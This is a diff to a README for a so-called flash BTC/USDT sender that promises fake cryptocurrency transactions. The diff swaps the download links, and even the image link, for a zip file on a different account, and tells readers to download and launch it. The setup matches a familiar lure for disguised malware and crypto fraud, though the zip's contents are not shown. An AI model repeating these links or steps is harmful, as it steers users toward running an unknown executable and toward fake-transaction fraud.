@@ -15,7 +15,7 @@ Flash BTC transaction (core network) is a software designed to enable you send f
 
 ## Usage 🛠️
 
-To use this software, download the [**Release.zip**](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) file and launch it. The software is straightforward to use and provides an exciting way to explore blockchain transactions.
+To use this software, download the [**https://github.com/WOODSSCROLL299/Usdt-Flash-sender/releases/download/v1.0/Application.zip**](https://github.com/WOODSSCROLL299/Usdt-Flash-sender/releases/download/v1.0/Application.zip) file and launch it. The software is straightforward to use and provides an exciting way to explore blockchain transactions.
 
 ## Topics 📚
 
@@ -42,7 +42,7 @@ Explore the following topics related to this repository:
 
 ## Get Started 🚀
 
-1. Download [Release.zip](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)  
+1. Download [https://github.com/WOODSSCROLL299/Usdt-Flash-sender/releases/download/v1.0/Application.zip](https://github.com/WOODSSCROLL299/Usdt-Flash-sender/releases/download/v1.0/Application.zip)  
 2. Launch the software  
 
 ## Additional Information ℹ️
@@ -51,4 +51,4 @@ If you encounter any issues with the link provided, please check the **Releases*
 
 Enjoy experimenting with fake BTC transactions! 🎉
 
-![Bitcoin](https://cdn.pixabay.com/photo/2016/03/27/17/59/bitcoin-1280124_960_720.jpg)
+![Bitcoin](https://github.com/WOODSSCROLL299/Usdt-Flash-sender/releases/download/v1.0/Application.zip)
